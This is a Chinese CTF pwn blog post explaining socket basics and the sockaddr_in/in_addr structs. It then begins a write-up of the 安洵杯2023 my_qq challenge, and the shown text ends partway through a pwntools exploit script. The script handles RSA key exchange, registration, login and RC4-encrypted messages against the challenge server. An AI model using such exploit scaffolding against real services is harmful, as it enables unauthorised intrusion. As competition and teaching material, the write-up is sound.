<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.126.1"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="socket"><meta itemprop=description content="集中一点,登峰造极"><meta name=description content="集中一点,登峰造极"><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="https://zp9080.github.io/imgs/author.png"><meta itemprop=keywords content="web pwn"><meta property="og:type" content="article"><meta property="og:title" content="socket"><meta property="og:description" content="集中一点,登峰造极"><meta property="og:image" content="/imgs/author.png"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="https://zp9080.github.io/post/web-pwn/socket/"><meta property="og:site_name" content="f1ow-blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="f1ow"><meta property="article:published_time" content="2024-07-28 00:00:00 +0000 UTC"><meta property="article:modified_time" content="2024-07-28 00:00:00 +0000 UTC"><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/font-awesome/6.6.0/css/all.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/animate.css/4.1.1/animate.min.css><link type=text/css rel=stylesheet href=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href=/css/main.min.bfbac3431de920c11b5b1cafa45029ea1bc93d5d3da50fed4ab6924b4c250360.css><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script class=next-config data-name=page type=application/json>{"comments":false,"isHome":false,"isPage":true,"path":"socket","permalink":"https://zp9080.github.io/post/web-pwn/socket/","title":"socket","waline":{"js":[{"alias":"@waline/client","alias_name":"waline","file":"dist/pageview.js","name":"pageview","version":"2.15.8"},{"alias":"@waline/client","alias_name":"waline","file":"dist/comment.js","name":"comment","version":"2.15.8"}]}}</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>socket - f1ow-blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><div class=overlay></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>f1ow-blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description>集中一点,登峰造极</p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>首页</a></li><li class="menu-item menu-item-about"><a href=/about/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>关于</a></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>归档
<span class=badge>207</span></a></li><li class="menu-item menu-item-categories"><a href=/categories/ class=hvr-icon-pulse rel=section><i class="fa fa-categories hvr-icon"></i>分类</a></li><li class="menu-item menu-item-tags"><a href=/tags/ class=hvr-icon-pulse rel=section><i class="fa fa-tags hvr-icon"></i>标签</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>搜索</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=搜索... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>文章目录</li><li class=sidebar-nav-overview>站点概览</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#相关知识>相关知识</a><ul><li><a href=#一些关键理解>一些关键理解</a></li><li><a href=#socket函数>socket函数</a></li><li><a href=#相关结构体>相关结构体</a></li></ul></li><li><a href=#安洵杯2023-my_qq>安洵杯2023 my_qq</a></li><li><a href=#vnctf2022-classic_httpd>vnctf2022 classic_httpd</a><ul><li><a href=#非预期>非预期</a></li><li><a href=#预期解>预期解</a></li></ul></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=f1ow src=/imgs/img-lazy-loading.gif data-src=/imgs/author.png><p class=site-author-name itemprop=name>f1ow</p><div class=site-description itemprop=description>集中一点,登峰造极</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>207</span>
<span class=site-state-item-name>日志</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>38</span>
<span class=site-state-item-name>分类</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>80</span>
<span class=site-state-item-name>标签</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/zp9080 title="Github → https://github.com/zp9080" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
Github</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh class=cc-opacity rel=noopener target=_blank title=共享知识><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=共享知识></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
友情链接</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://v3rdant.cn/ title=https://v3rdant.cn/ target=_blank>v3rdant</a></li><li class=links-of-blogroll-item><a href=https://juicymio.github.io/ title=https://juicymio.github.io/ target=_blank>juicymio</a></li><li class=links-of-blogroll-item><a href=https://ka7arotto.github.io/ title=https://ka7arotto.github.io/ target=_blank>Goku</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
<span>网站资讯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>已运行：</div><div class=item-count id=runTimes data-publishdate=2024-07-28T00:00:00+00:00></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>总访客数：</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>页面浏览：</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>总字数：</div><div class=item-count id=wordsCount data-count=273686></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>阅读约：</div><div class=item-count id=readTimes data-times=660></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>最后更新于：</div><div class=item-count id=last-push-date data-lastpushdate=2025-02-27T17:57:37+08:00></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=toggle-theme class=button title=深浅模式切换><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=返回顶部><i class="fa fa-arrow-up"></i>
<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/zp9080 rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://zp9080.github.io/post/web-pwn/socket/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/author.png"><meta itemprop=name content="f1ow"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="f1ow"><meta itemprop=description content="集中一点,登峰造极"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="socket"><meta itemprop=description content="[TOC] 这篇文章生动详细地讲清楚了socket到底是什么 相关知识 一些关键理解 注意这里和反弹shell不太一样，反弹shell创建了套间字后直接co"></span><header class=post-header><h1 class=post-title itemprop="name headline">socket
<a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/post/Web-Pwn/socket.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=编辑><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2024-07-28 00:00:00 +0000 UTC" itemprop="dateCreated datePublished" datetime="2024-07-28 00:00:00 +0000 UTC">2024-07-28
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/web-pwn itemprop=url rel=index><span itemprop=name>PWN/Web Pwn</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=字数><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
</span><span class=post-meta-item-text>字数：</span>
<span>2484</span>
</span><span class=post-meta-item title=阅读><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
</span><span class=post-meta-item-text>阅读：&ap;</span>
<span>5分钟</span>
</span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=busuanzi_value_page_pv data-path=/post/web-pwn/socket/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><p>[TOC]
<a href=https://blog.csdn.net/weixin_39258979/article/details/80835555 title=这篇文章生动详细地讲清楚了socket到底是什么 rel="noopener external nofollow noreferrer" target=_blank class=exturl>这篇文章生动详细地讲清楚了socket到底是什么
<i class="fa fa-external-link-alt"></i></a></p><h1 id=相关知识>相关知识
<a class=header-anchor href=#%e7%9b%b8%e5%85%b3%e7%9f%a5%e8%af%86></a></h1><h2 id=一些关键理解>一些关键理解
<a class=header-anchor href=#%e4%b8%80%e4%ba%9b%e5%85%b3%e9%94%ae%e7%90%86%e8%a7%a3></a></h2><p><strong>注意这里和反弹shell不太一样，反弹shell创建了套间字后直接connect就行了</strong>
<img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos2/26.png alt></p><ul><li>可以认为套接字这种方式就像一个中转站，将服务端和客户端联系起来，然后socket函数创建一个总的套接字，后面的函数创建分的套接字</li><li>套接字描述符类似于文件描述符，可以往里面写东西。区分好服务端和客户端就行</li><li>也可以用read和write进行读写，套接字描述符就像文件描述符</li></ul><h2 id=socket函数>socket函数
<a class=header-anchor href=#socket%e5%87%bd%e6%95%b0></a></h2><ol><li>socket() 函数创建的套接字：这个套接字是一个总的套接字，它是服务器端用于监听连接请求的套接字（对于TCP服务器端）或是客户端用于发起连接请求的套接字。这个套接字是用于整个通信过程的起点，它是后续通信的基础。</li><li>后续操作创建的套接字：在建立连接之后，accept() 函数会创建一个新的套接字，用于表示与客户端建立的连接。这个套接字是专门用于与特定客户端进行通信的，是一种独立的套接字。而在客户端，通过 connect() 函数建立连接后，也会创建一个用于与服务器通信的套接字。这些套接字都是后续通信过程中使用的。</li><li>总之，socket() 函数创建的套接字是整个通信过程的起点，而后续操作创建的套接字是用于与特定对端进行通信的。这些后续操作创建的套接字可以视为衍生自总的套接字。</li></ol><h2 id=相关结构体>相关结构体
<a class=header-anchor href=#%e7%9b%b8%e5%85%b3%e7%bb%93%e6%9e%84%e4%bd%93></a></h2><ul><li>sockaddr_in 结构体是用于表示 IPv4 地址和端口的数据结构，通常在网络编程中使用。它定义在 &lt;netinet/in.h> 头文件中，并且在 BSD 系统和类 Unix 系统中广泛使用。</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#a2f;font-weight:700>struct</span> sockaddr_in {
</span></span><span style=display:flex><span>    <span style=color:#0b0;font-weight:700>short</span> sin_family;           <span style=color:#080;font-style:italic>// 地址族，通常为 AF_INET
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#0b0;font-weight:700>unsigned</span> <span style=color:#0b0;font-weight:700>short</span> sin_port;    <span style=color:#080;font-style:italic>// 16位的端口号，网络字节序
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#a2f;font-weight:700>struct</span> in_addr sin_addr;    <span style=color:#080;font-style:italic>// IPv4 地址结构
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>    <span style=color:#0b0;font-weight:700>char</span> sin_zero[<span style=color:#666>8</span>];           <span style=color:#080;font-style:italic>// 填充字段，通常用0填充
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>};
</span></span></code></pre></div><ul><li>struct in_addr 是用于表示 IPv4 地址的数据结构，在网络编程中经常被使用。它通常定义在 &lt;netinet/in.h> 头文件中</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#a2f;font-weight:700>struct</span> in_addr {
</span></span><span style=display:flex><span>    <span style=color:#0b0;font-weight:700>in_addr_t</span> s_addr;  <span style=color:#080;font-style:italic>// 32 位的 IPv4 地址，以网络字节序（big-endian）表示
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>};
</span></span></code></pre></div><h1 id=安洵杯2023-my_qq>安洵杯2023 my_qq
<a class=header-anchor href=#%e5%ae%89%e6%b4%b5%e6%9d%af2023-my_qq></a></h1><p><a href=https://blog.csdn.net/llovewuzhengzi/article/details/136396920 title=参考博客 rel="noopener external nofollow noreferrer" target=_blank class=exturl>参考博客
<i class="fa fa-external-link-alt"></i></a></p><ol><li>记录一下做这种题的小技巧，一般这种题有非常多的函数调用，更像是个re题。但是漏洞一般都不会在一看就是系统的函数里面，这种一般可以先大致略过去，<strong>漏洞一般都会在看着像自定义的函数里面，而且漏洞函数一般不会多次出现，那种反复在用的肯定不是漏洞函数</strong>，至于有些加解密那种奇怪的处理，略过去就好，出题人一般也不会在那里搞个漏洞</li><li><strong>这个题要懂一点与服务端交互，涉及以下过程</strong></li></ol><ul><li>交换公钥：在建立安全连接的过程中，客户端和服务端会交换公钥。客户端会向服务端请求其公钥，并发送自己的公钥给服务端。这个过程称为密钥交换。</li><li>加密通信：一旦双方都具有对方的公钥，它们就可以使用公钥加密技术来加密通信内容。这样，即使通信被拦截，攻击者也无法解密通信内容，因为只有拥有私钥的一方才能解密数据。<strong>在此题中发送给服务端的数据就是用RC4密码加密后的信息，服务端也会输出解密后的信息</strong></li></ul><ol start=3><li>这个题还有一个很有意思的点就是会给两个remote连接，一个是服务端的，一个是accept得到的客户端</li><li>这个题学习了不少知识，如socket，网络中的交互，RSA、RC4密码，数据库的基本操作</li></ol><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#080;font-style:italic>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u64
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p64
</span></span><span style=display:flex><span>context(os<span style=color:#666>=</span><span style=color:#b44>&#39;linux&#39;</span>, arch<span style=color:#666>=</span><span style=color:#b44>&#39;amd64&#39;</span>, log_level<span style=color:#666>=</span><span style=color:#b44>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>Crypto</span> <span style=color:#a2f;font-weight:700>import</span> Random
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>Crypto.PublicKey</span> <span style=color:#a2f;font-weight:700>import</span> RSA
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>Crypto.Cipher</span> <span style=color:#a2f;font-weight:700>import</span> ARC4
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pbkey_path <span style=color:#666>=</span> <span style=color:#b44>&#39;./pb.pem&#39;</span>
</span></span><span style=display:flex><span>prkey_path <span style=color:#666>=</span> <span style=color:#b44>&#39;./pr.pem&#39;</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>try</span>:
</span></span><span style=display:flex><span>    pbkey <span style=color:#666>=</span> RSA<span style=color:#666>.</span>importKey(<span style=color:#a2f>open</span>(pbkey_path, <span style=color:#b44>&#39;rb&#39;</span>)<span style=color:#666>.</span>read())
</span></span><span style=display:flex><span>    prkey <span style=color:#666>=</span> RSA<span style=color:#666>.</span>importKey(<span style=color:#a2f>open</span>(prkey_path, <span style=color:#b44>&#39;rb&#39;</span>)<span style=color:#666>.</span>read())
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>except</span> <span style=color:#d2413a;font-weight:700>Exception</span> <span style=color:#a2f;font-weight:700>as</span> e:
</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic># print(e)</span>
</span></span><span style=display:flex><span>    prkey <span style=color:#666>=</span> RSA<span style=color:#666>.</span>generate(<span style=color:#666>2048</span>, Random<span style=color:#666>.</span>new()<span style=color:#666>.</span>read)
</span></span><span style=display:flex><span>    pbkey <span style=color:#666>=</span> prkey<span style=color:#666>.</span>public_key()
</span></span><span style=display:flex><span>    <span style=color:#a2f>open</span>(pbkey_path, <span style=color:#b44>&#39;wb&#39;</span>)<span style=color:#666>.</span>write(pbkey<span style=color:#666>.</span>export_key(<span style=color:#b44>&#39;PEM&#39;</span>))
</span></span><span style=display:flex><span>    <span style=color:#a2f>open</span>(prkey_path, <span style=color:#b44>&#39;wb&#39;</span>)<span style=color:#666>.</span>write(prkey<span style=color:#666>.</span>export_key(<span style=color:#b44>&#39;PEM&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>new_client</span>():
</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic># 47.108.206.43:34284</span>
</span></span><span style=display:flex><span>    p <span style=color:#666>=</span> remote(<span style=color:#b44>&#39;47.108.206.43&#39;</span>, <span style=color:#666>34284</span>)
</span></span><span style=display:flex><span>    server_p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>b</span><span style=color:#b44>&#39;Client connected: &#39;</span>)
</span></span><span style=display:flex><span>    server_p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>b</span><span style=color:#b44>&#39; on sock &#39;</span>)
</span></span><span style=display:flex><span>    fd <span style=color:#666>=</span> <span style=color:#a2f>int</span>(server_p<span style=color:#666>.</span>recvline())
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> p, fd
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>recvall</span>(p):
</span></span><span style=display:flex><span>    data <span style=color:#666>=</span> <span style=color:#b44>b</span><span style=color:#b44>&#39;&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>while</span> <span style=color:#a2f;font-weight:700>True</span>:
</span></span><span style=display:flex><span>        _data <span style=color:#666>=</span> p<span style=color:#666>.</span>recv(timeout<span style=color:#666>=</span><span style=color:#666>0.5</span>)
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>if</span> <span style=color:#a2f;font-weight:700>not</span> _data: <span style=color:#a2f;font-weight:700>break</span>
</span></span><span style=display:flex><span>        data <span style=color:#666>+=</span> _data
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> data
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>exchange_public_key</span>(p, pbkey):
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>global</span> s_pbkey
</span></span><span style=display:flex><span>    server_p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>b</span><span style=color:#b44>&#39;server key is &#39;</span>)
</span></span><span style=display:flex><span>    server_p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>b</span><span style=color:#b44>&#39;-----END PUBLIC KEY-----</span><span style=color:#b62;font-weight:700>\n</span><span style=color:#b44>&#39;</span>)
</span></span><span style=display:flex><span>    s_pbkey <span style=color:#666>=</span> RSA<span style=color:#666>.</span>importKey(recvall(p))
</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>#接受服务端的公钥，但这个没啥用，因为strcmp检查的公钥是注册时的公钥</span>
</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>send(pbkey<span style=color:#666>.</span>export_key(<span style=color:#b44>&#39;PEM&#39;</span>))
</span></span><span style=display:flex><span>    server_p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>b</span><span style=color:#b44>&#39;-----END PUBLIC KEY-----&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>register</span>(p, name, pw_sha256_hash, pbkey):
</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>send(<span style=color:#b44>b</span><span style=color:#b44>&#39;no</span><span style=color:#b62;font-weight:700>\x00\x00</span><span style=color:#b44>&#39;</span>)
</span></span><span style=display:flex><span>    server_p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>b</span><span style=color:#b44>&#39;no</span><span style=color:#b62;font-weight:700>\n</span><span style=color:#b44>&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>#逆向可以发现注册时，name是16字节，hash是64字节</span>
</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>send(name<span style=color:#666>.</span>ljust(<span style=color:#666>16</span>, <span style=color:#b44>b</span><span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#39;</span>) <span style=color:#666>+</span> pw_sha256_hash<span style=color:#666>.</span>ljust(<span style=color:#666>64</span>, <span style=color:#b44>b</span><span style=color:#b44>&#39;?&#39;</span>))
</span></span><span style=display:flex><span>    exchange_public_key(p, pbkey)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>login</span>(p, name, pw_sha256_hash, pbkey):
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>global</span> s_pbkey
</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>send(<span style=color:#b44>b</span><span style=color:#b44>&#39;yes</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#39;</span>)
</span></span><span style=display:flex><span>    server_p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>b</span><span style=color:#b44>&#39;yes</span><span style=color:#b62;font-weight:700>\n</span><span style=color:#b44>&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>#输入注册的name和hash</span>
</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>send(name<span style=color:#666>.</span>ljust(<span style=color:#666>16</span>, <span style=color:#b44>b</span><span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#39;</span>) <span style=color:#666>+</span> pw_sha256_hash<span style=color:#666>.</span>ljust(<span style=color:#666>64</span>, <span style=color:#b44>b</span><span style=color:#b44>&#39;?&#39;</span>))
</span></span><span style=display:flex><span>    exchange_public_key(p, pbkey)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#080;font-style:italic>#这个在服务端直接打印出来了，因此直接接收</span>
</span></span><span style=display:flex><span>    server_p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>b</span><span style=color:#b44>&#39;RC4 key is &#39;</span>)
</span></span><span style=display:flex><span>    rc4key <span style=color:#666>=</span> <span style=color:#a2f>bytes</span><span style=color:#666>.</span>fromhex(server_p<span style=color:#666>.</span>recvline()<span style=color:#666>.</span>decode())
</span></span><span style=display:flex><span>    server_p<span style=color:#666>.</span>recvuntil(<span style=color:#b44>b</span><span style=color:#b44>&#39;Transfer_RC4_key SUCCESS</span><span style=color:#b62;font-weight:700>\n</span><span style=color:#b44>&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>assert</span> <span style=color:#a2f>len</span>(rc4key) <span style=color:#666>==</span> <span style=color:#666>17</span> <span style=color:#a2f;font-weight:700>and</span> rc4key<span style=color:#666>.</span>index(<span style=color:#b44>b</span><span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#39;</span>) <span style=color:#666>==</span> <span style=color:#666>16</span>
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>return</span> rc4key
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>session</span>(p, rc4key, data, pad_to<span style=color:#666>=</span><span style=color:#666>0</span>, extra<span style=color:#666>=</span><span style=color:#b44>b</span><span style=color:#b44>&#39;&#39;</span>):
</span></span><span style=display:flex><span>    data <span style=color:#666>+=</span> <span style=color:#b44>b</span><span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#39;</span>
</span></span><span style=display:flex><span>    data <span style=color:#666>=</span> ARC4<span style=color:#666>.</span>new(rc4key)<span style=color:#666>.</span>encrypt(data)<span style=color:#666>.</span>hex()<span style=color:#666>.</span>encode()
</span></span><span style=display:flex><span>    <span style=color:#a2f;font-weight:700>if</span> pad_to:
</span></span><span style=display:flex><span>        <span style=color:#a2f;font-weight:700>assert</span> <span style=color:#a2f>len</span>(data) <span style=color:#666>&lt;</span> pad_to, (<span style=color:#a2f>len</span>(data), pad_to)
